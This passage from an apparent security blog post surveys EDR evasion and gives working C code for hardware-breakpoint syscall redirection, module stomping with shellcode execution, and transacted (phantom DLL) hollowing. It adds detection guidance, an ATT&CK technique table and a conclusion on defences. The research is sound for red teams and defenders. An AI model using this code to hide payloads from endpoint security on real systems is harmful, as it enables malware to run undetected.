        ctx->Rip = g_SyscallGadget; // Redirect to 'syscall; ret' in ntdll
        ctx->Dr0 = 0;               // Disarm breakpoint
        ctx->Dr7 &= ~0x1;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void ArmHardwareBreakpoint(PVOID pTarget, DWORD ssn, PVOID pGadget) {
    g_SSN = ssn;
    g_SyscallGadget = pGadget;

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    ctx.Dr0 = (DWORD64)pTarget; // Set breakpoint address
    ctx.Dr7 |= 0x1;             // Enable DR0 (local, execute)
    SetThreadContext(GetCurrentThread(), &ctx);

    AddVectoredExceptionHandler(1, HwBpHandler);
}
```

Copy


This technique is used in **RecycledGate**, **TartarusGate** derivatives, and various modern C2 BOFs (Beacon Object Files).

### Module Stomping & Phantom DLL Hollowing

**Module Stomping ( [T1055.013](https://attack.mitre.org/techniques/T1055/013/))** writes shellcode over a legitimate, already-loaded module’s `RX` section. Because the VAD (Virtual Address Descriptor) entry still reports the region as backed by a legitimate file, memory-scan heuristics that flag private `RX` regions miss it entirely.

```
// Module Stomping: overwrite a low-risk DLL's .text section with shellcode
void ModuleStomping(LPCWSTR szTargetDll, PVOID pShellcode, SIZE_T shellcodeSize) {
    // Load a benign, rarely-inspected DLL as the stomp target
    HMODULE hTarget = LoadLibraryW(szTargetDll); // e.g., L"xpsservices.dll"

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hTarget;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)((BYTE*)hTarget + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    // Find the .text section
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (memcmp(pSec->Name, ".text", 5) == 0) {
            PVOID pTextBase = (BYTE*)hTarget + pSec->VirtualAddress;
            DWORD oldProt;
            VirtualProtect(pTextBase, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProt);
            memcpy(pTextBase, pShellcode, shellcodeSize);
            VirtualProtect(pTextBase, shellcodeSize, PAGE_EXECUTE_READ, &oldProt);

            // Transfer execution into the stomped region
            ((void(*)())pTextBase)();
            break;
        }
    }
}
```

Copy


**Phantom DLL Hollowing** (or _Transacted Hollowing_) refines this further: a Windows transaction (`NtCreateTransaction`) is used to write a malicious PE image to a file, creating a section from it, then rolling back the transaction. The file on disk reverts to clean but the in-memory section retains the malicious image—evading file-based scanners while still looking like a file-backed mapping to the VAD.

```
// Transacted Hollowing — create a file-backed section backed by malicious content
// without leaving the payload on disk after the transaction is rolled back
HANDLE hTx = NULL;
NtCreateTransaction(&hTx, TRANSACTION_ALL_ACCESS, NULL, NULL, NULL, 0, 0, 0, NULL, NULL);

HANDLE hFile = CreateFileTransactedW(
    L"C:\\Windows\\Temp\\legit.dll",
    GENERIC_WRITE | GENERIC_READ,
    0, NULL, CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL, NULL, hTx, NULL, NULL);

WriteFile(hFile, pMaliciousPE, dwPESize, &dwWritten, NULL);

// Create section from the transacted (not-yet-committed) file
HANDLE hSection = NULL;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
    NULL, PAGE_READONLY, SEC_IMAGE, hFile);

// Roll back transaction — file on disk is clean again
NtRollbackTransaction(hTx, TRUE);

// Section is still valid and backed by the malicious image in memory
PVOID pBase = NULL;
SIZE_T viewSize = 0;
NtMapViewOfSection(hSection, GetCurrentProcess(), &pBase,
    0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_WRITECOPY);
```

Copy


> **Detection:** Defenders counter these techniques by comparing the hash of in-memory `.text` sections against the on-disk module (scan-on-load or periodic), monitoring transacted file operations (`TransactionManager` ETW channel), and flagging sections whose backing file no longer exists on disk.

* * *

## Technical Summary & API Matrix

| Phase | Technique | API Cross-Reference | MITRE TID |
| --- | --- | --- | --- |
| **Foundation** | Classic DLL Injection | `CreateRemoteThread`, `WriteProcessMemory` | [T1055.001](https://attack.mitre.org/techniques/T1055/001/) |
| **Foundation** | Process Hollowing | `NtUnmapViewOfSection`, `CreateProcessA` | [T1055.012](https://attack.mitre.org/techniques/T1055/012/) |
| **Foundation** | Manual DLL Mapping | `VirtualAllocEx`, Manual Import Resolution | [T1055.001](https://attack.mitre.org/techniques/T1055/001/) |
| **Foundation** | Reflective DLL Loading | Self-contained loader, PIC | [T1055.001](https://attack.mitre.org/techniques/T1055/001/) |
| **Hooking** | IAT Hook Detection | Import Directory parsing | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
| **Hooking** | DLL Unhooking | `VirtualProtect`, Memory restoration | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
| **Syscalls** | Direct Syscalls | Inline assembly, syscall instruction | [T1106](https://attack.mitre.org/techniques/T1106/) |
| **Syscalls** | Hell’s Gate / Halos Gate | Dynamic SSN resolution | [T1106](https://attack.mitre.org/techniques/T1106/) |
| **Syscalls** | Indirect Syscalls | ROP gadgets, `syscall; ret` | [T1055](https://attack.mitre.org/techniques/T1055/) |
| **Syscalls** | Stack Spoofing | Return address manipulation | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
| **Tracing** | ETW Patching | `EtwEventWrite` patching | [T1562.006](https://attack.mitre.org/techniques/T1562/006/) |
| **Tracing** | AMSI Bypass | `AmsiScanBuffer` patching | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
| **Modern** | Early Bird Injection | `QueueUserAPC`, `CreateProcess` (suspended) | [T1055](https://attack.mitre.org/techniques/T1055/) |
| **Modern** | Early Cascade Injection | Chained APC calls, multi-stage execution | [T1055](https://attack.mitre.org/techniques/T1055/) |
| **Modern** | Thread Hijacking | `SetThreadContext`, `SuspendThread` | [T1055.003](https://attack.mitre.org/techniques/T1055/003/) |
| **Modern** | VEH Execution | `AddVectoredExceptionHandler` | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
| **Modern** | Module Stomping | Memory overwrite in loaded modules | [T1055.013](https://attack.mitre.org/techniques/T1055/013/) |
| **Modern** | Sleep Obfuscation | Memory encryption during sleep | [T1055](https://attack.mitre.org/techniques/T1055/) |
| **Kernel** | BYOVD | Vulnerable signed driver + IOCTL exploit | [T1068](https://attack.mitre.org/techniques/T1068/) |
| **Kernel** | Callback Table Manipulation | `PspCreateProcessNotifyRoutine` zeroing | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
| **Kernel** | PPL Bypass | `EPROCESS.Protection` patch | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) |
| **Kernel** | Hardware Breakpoint Syscall | `DR0`–`DR3` \+ VEH interception | [T1106](https://attack.mitre.org/techniques/T1106/) |
| **Kernel** | Phantom DLL Hollowing | `NtCreateTransaction`, `NtRollbackTransaction` | [T1055.013](https://attack.mitre.org/techniques/T1055/013/) |
| **Kernel** | Transacted Hollowing | Transacted file-backed section mapping | [T1055.012](https://attack.mitre.org/techniques/T1055/012/) |

## Conclusion

EDR bypass research has consistently demonstrated one truth: **visibility gaps define opportunity**. As detection shifts from APIs to behavior, and from userland to kernel and hardware, attackers adapt by abusing trust, context, and execution semantics.

This timeline illustrates a clear pattern: each defensive innovation creates new constraints that offensive research systematically defeats. From Stephen Fewer’s [Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection) ( [T1055.001](https://attack.mitre.org/techniques/T1055/001/)) to Jackson\_T’s [SysWhispers](https://github.com/jthuraisamy/SysWhispers) ( [T1106](https://attack.mitre.org/techniques/T1106/)), to BYOVD campaigns exploiting `mhyprot2.sys` at scale, the community has consistently pushed the boundaries of what’s detectable.

Modern techniques like [Ekko](https://github.com/Cracked5pider/Ekko) sleep obfuscation, [ThreadStackSpoofer](https://github.com/mgeeky/ThreadStackSpoofer) ( [T1562.001](https://attack.mitre.org/techniques/T1562/001/)), and [module stomping](https://offensivedefence.co.uk/posts/module-stomping/) ( [T1055.013](https://attack.mitre.org/techniques/T1055/013/)) represent the convergence of userland techniques—combining memory manipulation, execution context spoofing, and ETW evasion into cohesive chains. But Phase 7 represents a category shift: once an attacker achieves kernel execution via BYOVD, the EDR’s userland and most kernel telemetry becomes irrelevant. The only reliable countermeasure at that tier is **HVCI (Hypervisor-Protected Code Integrity)**, which enforces that only WHQL-signed code runs in the kernel, and the **Vulnerable Driver Blocklist** maintained by Microsoft.

As detailed in my research on [Windows APIs](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/) and [ETW internals](https://benjitrapp.github.io/defenses/2024-02-11-etw/), the battlefield has moved far beyond simple API hooking. The [EDR Hook Detection Scanner](https://benjitrapp.github.io/attacks/2026-06-19-edr-hook-detection/) shows exactly which functions your EDR monitors at the user-mode level, while the [ETW-TI Deep Dive](https://benjitrapp.github.io/defenses/2026-06-19-etw-ti/) reveals what the kernel sees regardless of user-mode evasion—and where even kernel-mode evasion reaches its limit. Projects like [EDR Telemetry](https://www.edr-telemetry.com/) and [loldrivers.io](https://www.loldrivers.io/) are the community’s response to Phase 7: systematic cataloging of what each product sees (and misses) at each layer of the stack.

Understanding this evolution—grounded in Windows internals and telemetry design—is essential for both red teams and defenders navigating the modern endpoint arms race. The [MITRE ATT&CK framework](https://attack.mitre.org/) provides structure, but the techniques themselves evolve faster than taxonomies can capture them.

Written on January 18, 2026


[◀ Back to attack related posts](https://benjitrapp.github.io/attack)